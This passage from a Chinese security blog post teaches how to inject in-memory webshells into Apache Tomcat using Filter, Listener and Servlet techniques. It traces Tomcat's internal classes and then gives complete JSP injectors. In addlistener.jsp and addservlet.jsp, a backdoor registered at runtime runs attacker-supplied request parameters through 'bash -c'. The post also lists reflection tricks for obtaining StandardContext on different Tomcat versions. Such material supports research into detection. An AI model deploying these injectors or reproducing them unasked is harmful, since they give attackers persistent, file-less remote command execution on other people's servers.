class="string">"utf-8"</span>)<span class="comment">/*这里可以放一些初始化的参数*/</span></span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>访问任意路径的时候会执行doFilter方法</p><p><img src="/2022/05/26/Java-08/F79hG28qp9T_5DsAKWfu7re7g7E_uQydC8ExO4ECQE8.png" alt="image"></p><p>众所周知，filter是一个链式调用，跟一下filterChain的生成</p><p>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">            filterChain.setServlet(servlet);</span><br><span class="line">            filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">            StandardContext context = (StandardContext)wrapper.getParent();</span><br><span class="line">            FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">            <span class="keyword">if</span> (filterMaps != <span class="keyword">null</span> &amp;&amp; filterMaps.length != <span class="number">0</span>) &#123;</span><br><span class="line">                DispatcherType dispatcher = (DispatcherType)request.getAttribute(<span class="string">"org.apache.catalina.core.DISPATCHER_TYPE"</span>);</span><br><span class="line">                String requestPath = <span class="keyword">null</span>;</span><br><span class="line">                Object attribute = request.getAttribute(<span class="string">"org.apache.catalina.core.DISPATCHER_REQUEST_PATH"</span>);</span><br><span class="line">                <span class="keyword">if</span> (attribute != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    requestPath = attribute.toString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String servletName = wrapper.getName();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                ApplicationFilterConfig filterConfig;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; filterMaps.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; matchFiltersURL(filterMaps[i], requestPath)) &#123;</span><br><span class="line">                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());</span><br><span class="line">                        <span class="keyword">if</span> (filterConfig != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            filterChain.addFilter(filterConfig);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; filterMaps.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; matchFiltersServlet(filterMaps[i], servletName)) &#123;</span><br><span class="line">                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());</span><br><span class="line">                        <span class="keyword">if</span> (filterConfig != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            filterChain.addFilter(filterConfig);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> filterChain;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> filterChain;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里涉及三个对象，可以参考师傅的文章：<a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w" target="_blank" rel="noopener">JSP Webshell那些事 – 攻击篇(下) </a></p><p>总结下来：</p><p><code>filterDefs</code>存放了filter的定义，比如名称跟对应的类</p><p><code>filterConfigs</code>除了存放了filterDef还保存了当时的Context</p><p><code>FilterMaps</code>则对应了web.xml中配置的<code>&lt;filter-mapping&gt;</code>，里面代表了各个filter之间的调用顺序</p><p><img src="/2022/05/26/Java-08/T8QSRuSpB96Xsjx-F0NSmS9LHTvRXBk6nOQXNgd-NWE.png" alt="image"></p><p>filterChain的生成即遍历<code>FilterMaps</code> ，判断当前请求的servlet或者requestpath是否满足filerMaps限制的范围，如果满足则filterChain添加对应的<code>filterConfigs</code></p><p>接下来继续跟doFilter方法</p><p> org.apache.catalina.core.ApplicationFilterChain#doFilter</p><p><img src="/2022/05/26/Java-08/0G-6SWDH4i2CfxLBsyV8N9E9q9xbxIbILxV3RDfQEyw.png" alt="image"></p><p><code>Globals.IS_SECURITY_ENABLED</code> 默认为false，交由internalDoFilter处理</p><p><img src="/2022/05/26/Java-08/E0JdqQBdMTtYrtkMnAuKyRKGxccGAULBCi9M8lDkFGs.png" alt="image"></p><p>try中取出filter，然后调用其doFilter方法</p><p><img src="/2022/05/26/Java-08/A-eTZodjmGk-8BPFBXSgOht2oOhXfGbahYnWZU3HGW0.png" alt="image"></p><p>最后一个filter的doFilter方法将调用servlet.service</p><p>概述地说， <code>FilterChain.doFilter()</code> 方法将调用下一个 Filter.doFilter() 方法；最后一个 <code>Filter.doFilter()</code> 方法中调用的<code>FilterChain.doFilter()</code> 方法将调用目标 <code>Servlet.service()</code> 方法。</p><p>根据之前的代码filterconfig和filtermaps是从context里面获取，context的取值获取</p><p>org.apache.catalina.core.ApplicationFilterFactory</p><p><img src="/2022/05/26/Java-08/gynJZxt9kf8CHTZkzcmnFesaGWQ0lTGwxRRVU29tc-c.png" alt="image"></p><p>context实际对应这个类</p><p>org.apache.catalina.core.StandardContext</p><p>有几个比较重要的函数：</p><ul><li><p>StandardContext.addFilterDef()可以添加filterRefs</p></li><li><p>StandardContext.addFilterMap()可以添加filtermap</p></li></ul><p>那么Filter类型内存马的创建可以总结为如下步骤：</p><ol><li>获取context</li><li>创建一个恶意Filter，并将其封装成 FilterDef</li><li>添加FilterDef和filterConfigs</li></ol><p>获取context</p><p>当我们能直接获取 request 的时候，可以直接将 ServletContext 转为 StandardContext 从而获取 context</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>创建一个恶意Filter，并将其封装成 FilterDef</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DefaultFilter filter = <span class="keyword">new</span> DefaultFilter();</span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br></pre></td></tr></table></figure><p>添加FilterDef和filterConfigs</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line">FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line"><span class="comment">// filterMap.addURLPattern("/*");</span></span><br><span class="line">filterMap.addURLPattern(<span class="string">"/str3am"</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">Constructor constructor = ApplicationFilterConfig<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="title">Context</span>.<span class="title">class</span>, <span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><h2 id="Listener-Memory-Shell"><a href="#Listener-Memory-Shell" class="headerlink" title="Listener Memory Shell"></a>Listener Memory Shell</h2><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>addlistener.jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.*"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.annotation.WebServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServletRequest"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServletResponse"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.connector.Request"</span> %&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="keyword">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a parameter of <span class="string">"shell"</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(request.getParameter(<span class="string">"shell"</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//                    Runtime.getRuntime().exec(request.getParameter("shell"));</span></span><br><span class="line">                    <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,request.getParameter(<span class="string">"shell"</span>)).start();</span><br><span class="line">                    <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    out.println(<span class="string">"inject success"</span>);</span><br><span class="line">    S servletRequestListener = <span class="keyword">new</span> S();</span><br><span class="line">    standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="keyword">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a parameter of <span class="string">"shell"</span> --&gt;</span><br></pre></td></tr></table></figure><p>访问addlistener.jsp注入内存马即可</p><p><img src="/2022/05/26/Java-08/d87GwgGTtmq8zKikdnuFkJoPG1DeIJHIUa4dQfRsHKg.png" alt="image"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>Tomcat对于加载优先级是 <strong>listener -&gt; filter -&gt; servlet</strong></p><p>Listener分为以下几种：</p><ul><li>ServletContext，服务器启动和终止时触发</li><li>Session，有关Session操作时触发</li><li>Request，访问服务时触发</li></ul><p>前两种的触发方式都不适合作为内存Webshell</p><p>在应用中可能调用的监听器如下：</p><ul><li>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</li><li>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</li><li>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</li><li>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</li><li>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</li><li>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</li></ul><p>关注ServletRequestListener，访问任意资源的时候，都会触发requestInitialized方法</p><p>javax.servlet.ServletRequestListener</p><p><img src="/2022/05/26/Java-08/cmDDkgDMbs2QIfVHrH4STBhQiqAVxSZE7GSasywNgTE.png" alt="image"></p><p>这里ServletRequestEvent类型，可以通过其getServletRequest获取当前request对象，当然也可以直接使用request代表</p><p><img src="/2022/05/26/Java-08/18JH41ZnmafYV1QlLK_BZmp1Q16Al6PvIJvjG-zpBDQ.png" alt="image"></p><p>获取context后直接addApplicationEventListener添加listener即可</p><p>创建listener内存马步骤：</p><ol><li>获取context</li><li>创建恶意Listener</li><li>context添加恶意Listener到ApplicationEventListener中</li></ol><h2 id="Serlvet-Memory-Shell"><a href="#Serlvet-Memory-Shell" class="headerlink" title="Serlvet Memory Shell"></a>Serlvet Memory Shell</h2><h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>addservlet.jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.StandardContext"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.annotation.WebServlet"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.http.HttpServlet"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.http.HttpServletRequest"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.http.HttpServletResponse"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.io.IOException"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Field"</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> request <span class="keyword">this</span> file --&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span> request thisfile/../evilpage?cmd=calc --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">EvilServlet</span> <span class="keyword">implements</span> <span class="title">Servlet</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            HttpServletRequest request1 = (HttpServletRequest) req;</span><br><span class="line">            HttpServletResponse response1 = (HttpServletResponse) res;</span><br><span class="line">            <span class="keyword">if</span> (request1.getParameter(<span class="string">"cmd"</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//                Runtime.getRuntime().exec(request1.getParameter("cmd"));</span></span><br><span class="line">                <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,request1.getParameter(<span class="string">"cmd"</span>)).start();</span><br><span class="line">                <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">                response.getWriter().write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">                process.destroy();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                response1.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    EvilServlet evilServlet = <span class="keyword">new</span> EvilServlet();</span><br><span class="line">    org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();</span><br><span class="line">    evilWrapper.setName(<span class="string">"str3am"</span>);</span><br><span class="line">    evilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    evilWrapper.setServlet(evilServlet);</span><br><span class="line">    evilWrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line">    standardContext.addChild(evilWrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">"/str3am"</span>, <span class="string">"str3am"</span>);</span><br><span class="line">    out.println(<span class="string">"动态注入servlet成功"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/26/Java-08/gDDZJaxRg5paSgyFpG_QP3jQLwSdUADCgmM3oqNnV9w.png" alt="image"></p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>创建一个普通的servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"TestServlet"</span>, value = <span class="string">"/TestServlet"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时context的状态，可以看到我们的servlet被添加到了children中，对应的是使用StandardWrapper这个类进行封装</p><p><img src="/2022/05/26/Java-08/QQXzZHwE9FNMXDoXpS84WS9DYLl_hnjmsumUO8QF1FY.png" alt="image"></p><p>一个child对应一个封装了Servlet的StandardWrapper对象，其中有servlet的名字跟对应的类</p><p>类似FilterMaps，servlet也有对应的servletMappings，记录了urlParttern跟所对应的servlet的关系</p><p>综上所述，Servlet型内存Webshell的主要步骤如下：</p><ol><li>获取context</li><li>创建恶意Servlet</li><li>用Wrapper对其进行封装</li><li>添加封装后的恶意Wrapper到StandardContext的children当中</li><li>添加ServletMapping将访问的URL和Servlet进行绑定</li></ol><h2 id="获取StandardContext方法"><a href="#获取StandardContext方法" class="headerlink" title="获取StandardContext方法"></a>获取StandardContext方法</h2><ol><li>有request对象，由ServletContext转StandardContext</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure><ol start="2"><li>从ThreadLocal获取request</li></ol><p>这个方法来自于threedr3am师傅的<a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener">文章</a>，详细过程就不展开了，看文章即可。获取request之后，就可以获得StandardContext了，这种方法可以兼容tomcat 789，<strong>但在Tomcat 6下无法使用</strong>。</p><ol start="3"><li>从ContextClassLoader获取</li></ol><p>由于Tomcat处理请求的线程中，存在ContextLoader对象，而这个对象又保存了StandardContext对象，所以很方便就获取了，<strong>只可用于Tomcat 8 9</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure><ol start="4"><li>从MBean中获取<br>Tomcat 使用 JMX MBean 来实现自身的性能管理。而我们可以从jmxMBeanServer对象，在其field中一步一步找到StandardContext对象。具体实现过程和代码，可见<a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g" target="_blank" rel="noopener">这篇文章</a>，这种方法可以兼容Tomcat789，但有个很大的局限性在于，必须猜中项目名和host，才能获取到对应的standardContext对象</li><li>Tomcat 6789全版本的StandardContext获取方法</li></ol><ul><li><a href="https://xz.aliyun.com/t/9914" target="_blank" rel="noopener">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 